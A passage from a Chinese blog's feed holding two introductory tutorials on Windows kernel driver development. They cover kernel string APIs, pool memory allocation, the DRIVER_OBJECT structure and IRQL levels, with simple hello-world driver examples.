class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    UNICODE_STRING ustr,ustr2;</span><br><span class="line">    ULONG val,val2=<span class="number">0x12345678</span>;</span><br><span class="line">    LPWSTR str = <span class="string">L&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ustr, str);</span><br><span class="line">    <span class="built_in">RtlUnicodeStringToInteger</span>(&amp;ustr, <span class="number">10</span>, &amp;val);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;val=%d\n&quot;</span>), val);</span><br><span class="line"></span><br><span class="line">    WCHAR *S=(WCHAR*)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;str&#x27;</span>);</span><br><span class="line">    ustr<span class="number">2.</span>Buffer=S;</span><br><span class="line">    ustr<span class="number">2.L</span>ength=<span class="number">0</span>;</span><br><span class="line">    ustr<span class="number">2.</span>MaximumLength=<span class="number">0x1000</span>;</span><br><span class="line">    <span class="built_in">RtlIntegerToUnicodeString</span>(val2, <span class="number">16</span>, &amp;ustr2);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;val=%wZ\n&quot;</span>), ustr2);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中第二个参数 base 指示了字符串是什么进制。</p><img src="/2024/11/24/WindowsDriver1/3.png" class=""><p>可以发现，从数字转字符串还是需要废一点功夫的，需要手动给 UNICODE_STRING 结构体初始化分配内存。</p><p>但是也是显然的，该例程会存在内存泄漏，当驱动被释放的时候，分配的内存不会释放，因此需要养成良好的习惯，当不使用这个字符串的时候，及时释放分配的内存。</p><h2 id="字符串拷贝与比较"><a href="#字符串拷贝与比较" class="headerlink" title="字符串拷贝与比较"></a>字符串拷贝与比较</h2><p>例程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    UNICODE_STRING s1;</span><br><span class="line">    WCHAR* S = (WCHAR*)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;str&#x27;</span>);</span><br><span class="line">    s<span class="number">1.</span>Buffer = S;</span><br><span class="line">    s<span class="number">1.L</span>ength = <span class="number">0</span>;</span><br><span class="line">    s<span class="number">1.</span>MaximumLength = <span class="number">0x1000</span>;</span><br><span class="line">    <span class="built_in">RtlCopyUnicodeString</span>(&amp;s1, &amp;driver-&gt;DriverName);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;DriverName: %wZ\n&quot;</span>), s1);</span><br><span class="line">    <span class="keyword">auto</span> compare=<span class="built_in">RtlCompareUnicodeString</span>(&amp;s1, &amp;driver-&gt;DriverName, TRUE);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;compare=%d\n&quot;</span>), compare);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RtlCopyUnicodeString 就是简单的字符串拷贝函数，不做过多解释。</p><p>RtlCompareUnicodeString 是字符串比较函数，与 strcmp 一样，字符串相等返回 0，不相等返回非 0，第三个参数指示英文单词是否大小写敏感，TRUE 则敏感，S 与 s 视为不同的字符。</p><img src="/2024/11/24/WindowsDriver1/4.png" class=""><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>还有一系列的字符串操作函数也不一一展示了，它们都是 Rtl 为前缀命名的 API。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：MSDN</li></ul>]]></content>
    
    
    <summary type="html">来简单实战几个字符串API</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="驱动程序开发" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows驱动开发（0）——Windows驱动开发的基础知识</title>
    <link href="https://xia0ji233.github.io/2024/11/23/WindowsDriver0/"/>
    <id>https://xia0ji233.github.io/2024/11/23/WindowsDriver0/</id>
    <published>2024-11-22T19:00:00.000Z</published>
    <updated>2025-01-20T02:05:53.257Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下Windows驱动开发基础</p><span id="more"></span><p>由于之前操之过急，对驱动开发很多东西都没有了解便强行上手，导致后面困难重重，于是痛定思痛，开始推翻重来，相信之前的一些开发经验会让这一路好走一点。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vmware + VirtualKD + windbg preview 做调试环境。</p><p>VS 2022 + WDK 做开发环境。</p><p><a href="https://xia0ji233.pro/2023/04/13/driver1/">参考链接1</a></p><p><a href="https://xia0ji233.pro/2023/05/17/driver8/">参考链接2</a></p><h2 id="内核API的使用"><a href="#内核API的使用" class="headerlink" title="内核API的使用"></a>内核API的使用</h2><p>对于导出的函数，只需要包含对应的头文件直接使用即可，内核 API 的返回类型几乎都是 NTSTATUS。</p><p>当你调用的内核函数，如果返回的结果不是<code>STATUS_SUCCESS</code>，就说明函数执行中遇到了问题，具体是什么问题，可以在<code>ntstatus.h</code>文件中查看。</p><h2 id="驱动基本数据类型"><a href="#驱动基本数据类型" class="headerlink" title="驱动基本数据类型"></a>驱动基本数据类型</h2><p>WDK 对于一些标量有自己的书写习惯</p><table><thead><tr><th align="center">WDK 习惯</th><th align="center">SDK 习惯</th></tr></thead><tbody><tr><td align="center">ULONG</td><td align="center">unsigned long</td></tr><tr><td align="center">PULONG</td><td align="center">unsigned long*</td></tr><tr><td align="center">UCHAR</td><td align="center">unsigned char</td></tr><tr><td align="center">PUCHAR</td><td align="center">unsigned char*</td></tr><tr><td align="center">UINT</td><td align="center">unsigned int</td></tr><tr><td align="center">PUNIT</td><td align="center">unsigned int*</td></tr><tr><td align="center">VOID</td><td align="center">void</td></tr><tr><td align="center">PVOID</td><td align="center">void*</td></tr></tbody></table><h2 id="常用的内核内存函数"><a href="#常用的内核内存函数" class="headerlink" title="常用的内核内存函数"></a>常用的内核内存函数</h2><p>即，如何使用内核的堆内存，在用户层我们知道可以使用 malloc 或者一些 windows API，就算没有库也可以使用系统调用去申请内存。但是在内核层，内核的开发环境同样支持了一系列的内存分配函数。</p><p>内存对应的操作有：分配，释放，拷贝，清空。</p><table><thead><tr><th align="center">普通程序</th><th align="center">内核中</th></tr></thead><tbody><tr><td align="center">malloc</td><td align="center">ExAllocatePoolWithTag</td></tr><tr><td align="center">memset</td><td align="center">RtlFillMemory</td></tr><tr><td align="center">memcpy</td><td align="center">RtlMoveMemory</td></tr><tr><td align="center">free</td><td align="center">ExFreePool</td></tr></tbody></table><p>这里有个概念需要补一下，什么是<strong>分页内存</strong>，什么是<strong>非分页内存</strong>。</p><p>在使用 ExAllocatePoolWithTag 函数申请内存的时候会有<code>POOL_TYPE PoolType</code>这个参数。那么什么是<code>POOL_TYPE</code>，通过 WDK 我们可以看到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> &#123;</span></span><br><span class="line">    NonPagedPool,</span><br><span class="line">    PagedPool,</span><br><span class="line">    NonPagedPoolMustSucceed,</span><br><span class="line">    DontUseThisType,</span><br><span class="line">    NonPagedPoolCacheAligned,</span><br><span class="line">    PagedPoolCacheAligned,</span><br><span class="line">    NonPagedPoolCacheAlignedMustS</span><br><span class="line">&#125; POOL_TYPE;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用的最多的就是前两个，<code>NonPagedPool</code>和<code>PagedPool</code>，前者分配<strong>非分页内存</strong>，后者申请<strong>分页内存</strong>。什么是<strong>分页内存</strong>，前面介绍过，在 Windows 操作系统中，有 pagefile.sys 这个文件，这个文件会保存长期不使用的物理页，如果申请<strong>分页内存</strong>，那么这个页就有可能会被置换到这个文件中去。等到再次需要的时候，会通过一个 0xE 号中断将该页从 pagefile.sys 中又取出来。</p><p>而<strong>非分页内存</strong>就是告诉操作系统，不要把我的申请的物理页撤走，这就是我独享的物理页。操作系统就不会把它给撤走转到文件中了。</p><p>至于有什么用，后面应该会看到。</p><h2 id="内核字符串"><a href="#内核字符串" class="headerlink" title="内核字符串"></a>内核字符串</h2><p>内核有两种字符串类型。<code>ANSI_STRING</code>&#x2F;<code>UNICODE_STRING</code> 分别表示 ASCII 字符和宽字符。</p><p>来看看它们的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125;STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure><p>几乎都是这样的定义：长度，最大长度，字符指针，原因就是内核需要非常安全，直接操作字符容易造成一系列不可控的后果，因此在原字符指针上再封装一层。</p><p>同样来看看字符串的基本操作的 API </p><p>创建、复制、比较以及转换等。它们的函数如下：</p><table><thead><tr><th align="center">ANSI_STRING</th><th align="center">UNICODE_STRING</th></tr></thead><tbody><tr><td align="center">RtlInitAnsiString</td><td align="center">RtlInitUnicodeString</td></tr><tr><td align="center">RtlCopyString</td><td align="center">RtlCopyUnicodeString</td></tr><tr><td align="center">RtlCompareString</td><td align="center">RtlCompareUnicodeString</td></tr><tr><td align="center">RtlAnsiStringToUnicodeString</td><td align="center">RtlUnicodeStringToAnsiString</td></tr></tbody></table><h2 id="驱动代码解析"><a href="#驱动代码解析" class="headerlink" title="驱动代码解析"></a>驱动代码解析</h2><p>还是拿最经典的 hello world 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h3><p><code>DriverEntry</code>是驱动程序的入口，如果驱动加载成功后，就像<code>Dll</code>加载成功调用<code>DllMain</code>函数一样，调用该函数。</p><p>但是，编译成功后可以发现，DriverEntry 跟 main 一样，并不是程序加载最先调用的，都是间接被调用的，而真正的入口是 FxDriverEntry。</p><img src="/2024/11/23/WindowsDriver0/1.png" class=""><p>并且该函数是被导出的。</p><p>DriverEntry 的第一个参数需要来解析一下，它的类型是 <code>PDRIVER_OBJECT</code>，熟悉 Windows SDK 命名的应该知道，它是一个指向 <code>DRIVER_OBJECT</code> 的指针。</p><p>驱动文件加载之后，驱动的所有信息通过这个结构体来返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line"></span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line"></span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING DriverName;</span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line"></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以在驱动中加个断点，来查看这个对象</p><img src="/2024/11/23/WindowsDriver0/2.png" class=""><p>这里逐步分析该结构体的各个字段意义</p><ul><li>Type：类型</li><li>Size：结构体大小</li><li>DeviceObject：设备对象</li><li>Flags：标志位</li><li>DriverStart：驱动对象加载后的起始地址</li><li>DriverSize：驱动对象加载后的内存大小</li><li>DriverSection：它是一个存储目前所有已加载的驱动程序信息相关的<code>LDR_DATA_TABLE_ENTRY</code>结构体的双向循环链表。</li><li>DriverName：驱动名</li><li>DriverUnload：驱动对象的卸载地址，如果存在则会调用它</li></ul><p>其余就不一一写出了。</p><h2 id="IRQL"><a href="#IRQL" class="headerlink" title="IRQL"></a>IRQL</h2><p><code>IRQL</code>全称<code>Interrupt Request Level</code>，即<strong>中断请求等级</strong>。它是<code>Windows</code>自己定义的一套优先级方案，与<code>CPU</code>无关，数值越大权限越高。中断包括了硬中断和软中断，硬中断是由硬件产生，而软中断则是完全虚拟出来的。处理器在一个<code>IRQL</code>上执行线程代码，每个处理器的<code>IRQL</code>决定了它如何处理中断，以及允许接收哪些中断。在同一处理器上，线程只能被更高级别<code>IRQL</code>的线程能中断。每个处理器都有自己的中断<code>IRQL</code>。</p><img src="/2024/11/23/WindowsDriver0/3.png" class=""><p>常见的<code>IRQL</code>级别有四个：<code>Passive</code>、<code>APC</code>、<code>Dispatch</code>、<code>DIRQL</code>。<code>PASSIVE_LEVEL</code>是最低级别，没有被屏蔽的中断，线程执行用户模式，可以访问分页内存。</p><p><code>APC_LEVEL</code>只有<code>APC</code>级别的中断被屏蔽，可以访问分页内存。当有<code>APC</code>发生时，处理器提升到<code>APC</code>级别，就屏蔽掉其它<code>APC</code>。</p><p><code>DISPATCH_LEVEL</code>可以屏蔽<code>DPC</code>(延迟过程) 和更低的中断，不能访问分页内存。</p><h2 id="关于分页内存和非分页内存"><a href="#关于分页内存和非分页内存" class="headerlink" title="关于分页内存和非分页内存"></a>关于分页内存和非分页内存</h2><p>上面提到，中断等级在 <code>DISPATCH_LEVEL</code> 及以上时无法访问分页内存。因为分页内存会被换到外存，如果想要加载到内存中会触发一个缺页中断，将该页重新加载进内存，该例程运行在 <code>DISPATCH_LEVEL</code> 的中断等级下。而这个所谓的中断是不允许同级打断的，因此在 <code>DISPATCH_LEVEL</code> 下访问分页内存会导致访问内存的线程一直尝试等待物理页被写入内存，而触发的中断又无法直接打断该例程，就有可能直接造成蓝屏。</p><p>而根据看雪某帖子下面的评论描述，访问分页内存的时候会同时判断 IRQL 和物理页的 valid 位，当 <code>IRQL &gt; APC_LEVEL</code> 且物理页 <code>valid=0</code> 时，直接蓝屏。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15491543.html">https://www.cnblogs.com/wingsummer/p/15491543.html</a></li><li>[2]：<a href="https://bbs.kanxue.com/thread-160200.htm">https://bbs.kanxue.com/thread-160200.htm</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下Windows驱动开发基础</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="驱动程序开发" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
</feed>
